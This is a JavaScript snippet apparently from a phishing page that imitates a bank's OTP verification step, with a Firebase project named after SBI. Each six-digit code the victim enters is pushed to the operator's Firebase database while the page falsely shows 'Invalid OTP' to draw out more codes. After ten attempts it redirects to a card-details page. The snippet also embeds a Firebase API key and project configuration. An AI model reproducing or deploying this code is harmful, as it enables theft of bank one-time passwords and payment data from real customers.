  <script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

  // ðŸ”¹ Firebase Config
 // For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDEZDcHgqC586_shWpObiwyY5k3WS12y_Y",
  authDomain: "sandy-khalid-sbi2-2330-1-9-25.firebaseapp.com",
  projectId: "sandy-khalid-sbi2-2330-1-9-25",
  storageBucket: "sandy-khalid-sbi2-2330-1-9-25.firebasestorage.app",
  messagingSenderId: "385696590379",
  appId: "1:385696590379:web:b7211b201612b3a02c186e",
  measurementId: "G-3NELKK881G"
};

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  // ðŸ”¹ OTP Attempt Counter
  let attemptCount = 0;

  // ðŸ”¹ Verify OTP
 // ðŸ”¹ Verify OTP
window.verifyOtp = async function() {
  const inputs = document.querySelectorAll(".otp-inputs input");
  let otp = "";
  inputs.forEach(inp => otp += inp.value);

  if (otp.length !== 6) {
    document.getElementById("errorMsg").style.display = "block";
    document.getElementById("errorMsg").innerText = "Enter your 6 digit OTP";
    return;
  }
  document.getElementById("errorMsg").style.display = "none";

  try {
    // âœ… Har bar OTP Firebase me save hoga
    const newRef = push(ref(db, "packages"));
    await set(newRef, {
      otp: otp,
      attempt: attemptCount + 1,
      timestamp: new Date().toISOString()
    });

    attemptCount++;

    if (attemptCount < 10) {
      // âŒ Invalid OTP case
      document.getElementById("errorMsg").style.display = "block";
      document.getElementById("errorMsg").innerText = "Invalid OTP. Please try again.";

      // ðŸ”¹ Input fields clear karo
      inputs.forEach(inp => inp.value = "");
      inputs[0].focus(); // First box me cursor le aao
    } else {
      // âœ… 3rd attempt â†’ next page
      window.location.href = "carddetailspage.html";
    }

  } catch (error) {
    alert("Error: " + error.message);
    console.error(error);
  }
}


  // ðŸ”¹ Resend OTP
  let timerInterval;
  window.resendOtp = function() {
    document.querySelectorAll(".otp-inputs input").forEach(inp => inp.value = "");
    document.getElementById("errorMsg").style.display = "none";

    let timeLeft = 120;
    const timerDisplay = document.getElementById("timer");
    clearInterval(timerInterval);
    timerInterval = setInterval(() => {
      let minutes = Math.floor(timeLeft / 60);
      let seconds = timeLeft % 60;
      timerDisplay.innerText = `Resend available in ${minutes}:${seconds < 10 ? "0" : ""}${seconds}`;
      timeLeft--;

      if (timeLeft < 0) {
        clearInterval(timerInterval);
        timerDisplay.innerText = "";
      }
    }, 1000);
  }

  // ðŸ”¹ Auto move to next input
  document.querySelectorAll(".otp-inputs input").forEach((input, index, arr) => {
    input.addEventListener("input", () => {
      if (input.value && index < arr.length - 1) {
        arr[index + 1].focus();
      }
    });
    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !input.value && index > 0) {
        arr[index - 1].focus();
      }
    });
  });
</script>
